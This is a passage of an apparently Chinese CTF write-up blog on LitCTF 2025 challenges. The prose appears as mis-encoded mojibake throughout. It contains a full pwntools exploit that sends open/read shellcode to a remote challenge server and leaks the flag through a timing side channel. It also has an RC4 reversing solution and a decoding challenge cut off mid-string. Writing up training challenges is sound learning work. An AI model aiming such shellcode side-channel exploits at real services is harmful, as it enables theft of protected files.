class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome LitCTF 2025&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your shellcode: &quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  init_sandbox();</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å°±æ˜¯ä¸€ä¸ª shellcode é¢˜ï¼Œæ˜è¯´äº†å†™å…¥ shellcodeï¼Œä½†æ˜¯ä¸èƒ½ readï¼Œæœ‰ open å€’æ˜¯å¯ä»¥è¡Œï¼Œå¯ä»¥è¯»å– flag æ–‡ä»¶åˆ°å†…å­˜å†è€ƒè™‘è¾“å‡ºçš„äº‹å„¿ï¼Œä½†æ˜¯å¥½åƒä¸å…è®¸è¾“å‡ºï¼Œè¿™é‡Œæœ‰ä¸ªæ–‡ç« è¯´çš„æ˜¯æµ‹ä¿¡é“çˆ†ç ´ï¼Œå°±æ˜¯æŠŠ flag è¯»åˆ°å†…å­˜ä¸­ï¼Œç„¶åå»çˆ†ç ´ï¼Œå¹¶ä¸”ç»™äº†ä¸ª shellcode å¯ä»¥å¢åŠ æ•ˆç‡å’Œå‡†ç¡®æ€§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">i, c</span>):</span><br><span class="line">        <span class="keyword">global</span> io</span><br><span class="line">        io=remote(<span class="string">&quot;node6.anna.nssctf.cn&quot;</span>,<span class="number">26324</span>)</span><br><span class="line">        <span class="comment"># io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;Please input your shellcode: \n&#x27;</span>)</span><br><span class="line">        sc=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov rax, 0</span></span><br><span class="line"><span class="string">        movabs rax, 0x67616C66</span></span><br><span class="line"><span class="string">        push 0</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        push rsp</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 2</span></span><br><span class="line"><span class="string">        syscall </span></span><br><span class="line"><span class="string">        mov rsi, rdi</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        mov rdx, 0x100</span></span><br><span class="line"><span class="string">        syscall </span></span><br><span class="line"><span class="string">        mov al, [rsp+&#123;&#125;]</span></span><br><span class="line"><span class="string">        cmp al, &#123;&#125;</span></span><br><span class="line"><span class="string">        jbe $</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(i, c))</span><br><span class="line">        io.send(sc)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                io.recv(timeout=<span class="number">3</span>)</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">6</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        l = <span class="number">0x20</span></span><br><span class="line">        r = <span class="number">0x80</span></span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">                m = (l + r) // <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> find(i, m):</span><br><span class="line">                        r = m - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        l = m + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> l==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(l)</span><br><span class="line">        flag += <span class="built_in">chr</span>(l)</span><br><span class="line">        info(<span class="string">&quot;win!!!!!!!!!!!!!!!!!!!!!!!!! &quot;</span>)</span><br><span class="line">        info(flag)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;flag: &quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;d80c8e83-f706-4ec1-a0df-b304de99a80d&#125;</span></span><br><span class="line"><span class="comment">#æœ€åflag ï¼š NSSCTF&#123;d80c8e83-f706-4ec1-a0df-b304de99a80d&#125;</span></span><br></pre></td></tr></table></figure><blockquote><ol><li><code>movabs rax, 0x67616C66</code>  - è¿™æ˜¯ &quot;flag&quot; çš„ ASCII ç ï¼ˆå°ç«¯åºï¼Œå®é™…åœ¨å†…å­˜ä¸­æ˜¯ &quot;flag&quot;ï¼‰</li><li><code>push 0</code>  å’Œ  <code>push rax</code>  - å°† &quot;flag&quot; å­—ç¬¦ä¸²å‹å…¥æ ˆä¸­</li><li><code>push rsp</code>  å’Œ  <code>pop rdi</code>  - ä½¿ rdi æŒ‡å‘ &quot;flag&quot; å­—ç¬¦ä¸²çš„åœ°å€ï¼ˆä½œä¸ºæ–‡ä»¶åï¼‰</li><li><code>mov rax, 2</code>  - è®¾ç½®ä¸º open ç³»ç»Ÿè°ƒç”¨ï¼ˆæ–‡ä»¶æ‰“å¼€ï¼‰</li><li><code>syscall</code>  - æ‰“å¼€ &quot;flag&quot; æ–‡ä»¶</li></ol><p>æ¥ä¸‹æ¥ï¼š</p><ol start="6"><li><code>mov rsi, rdi</code>  - å°†æ–‡ä»¶æè¿°ç¬¦æ”¾å…¥ rsi</li><li><code>mov rdi, rax</code>  - å°†æ–‡ä»¶æè¿°ç¬¦æ”¾å…¥ rdiï¼ˆä½œä¸º read çš„æ–‡ä»¶æè¿°ç¬¦ï¼‰</li><li><code>mov rdx, 0x100</code>  - è®¾ç½®è¦è¯»å–çš„å­—èŠ‚æ•°ä¸º 256</li><li><code>syscall</code>  - è¯»å–æ–‡ä»¶å†…å®¹ï¼ˆè¯»åˆ°æ ˆä¸Šï¼Œå› ä¸º rsi è¢«è®¾ç½®ä¸ºæ ˆæŒ‡é’ˆï¼‰</li></ol><p>æœ€åï¼š</p><ol start="10"><li><code>mov al, [rsp+&#123;&#125;]</code>  - ä»æ ˆä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼ˆæ–‡ä»¶å†…å®¹çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼‰</li><li><code>cmp al, &#123;&#125;</code>  - ä¸é¢„è®¾å€¼æ¯”è¾ƒ</li><li><code>jbe $</code>  - å¦‚æœå°äºç­‰äºï¼Œåˆ™æ— é™å¾ªç¯</li></ol></blockquote><h1 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Reï¼š</h1><h2 id="litctf-2025easy_rc4"><a class="markdownIt-Anchor" href="#litctf-2025easy_rc4">#</a> [LitCTF 2025]easy_rc4:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">9</span>]; <span class="comment">// [rsp+7h] [rbp-319h] BYREF</span></span><br><span class="line">  _QWORD v5[<span class="number">31</span>]; <span class="comment">// [rsp+10h] [rbp-310h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+108h] [rbp-218h]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [rsp+10Ch] [rbp-214h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+10Eh] [rbp-212h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+110h] [rbp-210h] BYREF</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+118h] [rbp-208h]</span></span><br><span class="line">  _BYTE v11[<span class="number">232</span>]; <span class="comment">// [rsp+120h] [rbp-200h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+208h] [rbp-118h]</span></span><br><span class="line">  __int16 v13; <span class="comment">// [rsp+20Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [rsp+20Eh] [rbp-112h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">8</span>]; <span class="comment">// [rsp+210h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+218h] [rbp-108h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+220h] [rbp-100h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v18; <span class="comment">// [rsp+228h] [rbp-F8h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+230h] [rbp-F0h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+238h] [rbp-E8h]</span></span><br><span class="line">  _BYTE v21[<span class="number">200</span>]; <span class="comment">// [rsp+240h] [rbp-E0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+308h] [rbp-18h]</span></span><br><span class="line">  __int16 v23; <span class="comment">// [rsp+30Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> v24; <span class="comment">// [rsp+30Eh] [rbp-12h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v25; <span class="comment">// [rsp+318h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v25 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;FenKey!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_2020);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;rrrrrcccc4444444!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you input flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s40&quot;</span>, v5);</span><br><span class="line">  *(_QWORD *)s1 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="keyword">sizeof</span>(v11));</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)s2 = <span class="number">0x4973F431134ECC78</span>LL;</span><br><span class="line">  v16 = <span class="number">0x7E35F4C0734F6C4F</span>LL;</span><br><span class="line">  v17 = <span class="number">0xEA7A60194D7627CE</span>LL;</span><br><span class="line">  v18 = <span class="number">0xF61CDA8142C05D44</span>LL;</span><br><span class="line">  v19 = <span class="number">0x13F8FA94D9587264</span>LL;</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  rc4_init(v4, <span class="number">8LL</span>, &amp;S);</span><br><span class="line">  rc4_crypt(v5, s1, <span class="number">40LL</span>, &amp;S);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag is correct&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(&amp;byte_2076);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹keyï¼šFenKey!!</p><p>â€‹å¯†æ–‡ï¼ˆå°ç«¯åºï¼‰:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)s2 = <span class="number">0x4973F431134ECC78</span>LL;</span><br><span class="line">v16 = <span class="number">0x7E35F4C0734F6C4F</span>LL;</span><br><span class="line">v17 = <span class="number">0xEA7A60194D7627CE</span>LL;</span><br><span class="line">v18 = <span class="number">0xF61CDA8142C05D44</span>LL;</span><br><span class="line">v19 = <span class="number">0x13F8FA94D9587264</span>LL;</span><br></pre></td></tr></table></figure><p>â€‹æå–ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x78 0xCC 0x4E 0x13 0x31 0xF4 0x73 0x49 0x4F 0x6C 0x4F 0x73 0xC0 0xF4 0x35 0x7E 0xCE 0x27 0x76 0x4D 0x19 0x60 0x7A 0xEA 0x44 0x5D 0xC0 0x42 0x81 0xDA 0x1C 0xF6 0x64 0x72 0x58 0xD9 0x94 0xFA 0xF8 0x13</span><br></pre></td></tr></table></figure><p>â€‹åœ¨ RC4 åŠ å¯†ä»£ç ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rc4_crypt</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// kr00_8</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v8 = (v8 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v4 = *(<span class="type">unsigned</span> __int8 *)(v8 + a4) + v9;</span><br><span class="line">    v9 = (<span class="type">unsigned</span> __int8)(HIBYTE(v4) + *(_BYTE *)(v8 + a4) + v9) - HIBYTE(HIDWORD(v4));</span><br><span class="line">    swap(v8 + a4, a4 + v9);</span><br><span class="line">    *(_BYTE *)((<span class="type">int</span>)i + a2) = *(_BYTE *)((<span class="type">unsigned</span> __int8)(*(_BYTE *)(v8 + a4) + *(_BYTE *)(v9 + a4)) + a4) ^ *(_BYTE *)((<span class="type">int</span>)i + a1) ^ <span class="number">0x20</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å­˜åœ¨ä¸€ä¸ªé¢å¤–çš„å¼‚æˆ–æ“ä½œï¼Œæ‰€ä»¥ä¹‹åå°±å¥½åŠäº†ï¼Œå¯†é’¥æ˜¯ FenKey!!ï¼Œå¯†æ–‡çš„ hex ä¸ºï¼š</p><blockquote><p>0x78 0xCC 0x4E 0x13 0x31 0xF4 0x73 0x49 0x4F 0x6C 0x4F 0x73 0xC0 0xF4 0x35 0x7E 0xCE 0x27 0x76 0x4D 0x19 0x60 0x7A 0xEA 0x44 0x5D 0xC0 0x42 0x81 0xDA 0x1C 0xF6 0x64 0x72 0x58 0xD9 0x94 0xFA 0xF8 0x13</p></blockquote><p>â€‹è¿›è¡Œ RC4 è§£å¯†ä¹‹åï¼Œå¯¹å…¶è¿›è¡Œå¯¹ 0x20 çš„å¼‚æˆ–å¾—åˆ° flagï¼š</p><p><code>LitCTF&#123;71bb2a06417a5306ba297ddcfce7b1b0&#125;</code></p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Misc</h1><h2 id="litctf-2025çµæ„Ÿè‡å“©è‡å“©è‡å“©å“‡æ“¦çµæ„Ÿè‡çµæ„Ÿè‡"><a class="markdownIt-Anchor" href="#litctf-2025çµæ„Ÿè‡å“©è‡å“©è‡å“©å“‡æ“¦çµæ„Ÿè‡çµæ„Ÿè‡">#</a> [LitCTF 2025] çµæ„Ÿè‡ğŸ„å“©è‡å“©è‡å“©å“‡æ“¦çµæ„Ÿè‡çµæ„Ÿè‡ğŸ„</h2><p>â€‹é¡¹ç›® https://github.com/ProbiusOfficial/Lingicryptï¼Œå¯ä»¥ç›´æ¥è§£å¯†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~$ python exp.py -d &quot;çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦å“‡æ“¦å“‡æ“¦è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡è‡è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡è‡è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦å“©å“©å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡è‡å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦å“©å“‡æ“¦å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©å“©å“©å“‡æ“¦è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“©å“‡æ“¦å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦è‡è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“‡æ“¦è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦è‡è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“‡æ“¦å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡è‡è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦è‡è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“©å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦è‡è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“©å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“©å“‡æ“¦å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“©å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“©å“‡æ“¦å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“©å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“‡æ“¦å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“©å“‡æ“¦å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡è‡å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“©å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“©å“‡æ“¦å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©å“©å“©å“‡æ“¦å“‡æ“¦çµæ„Ÿè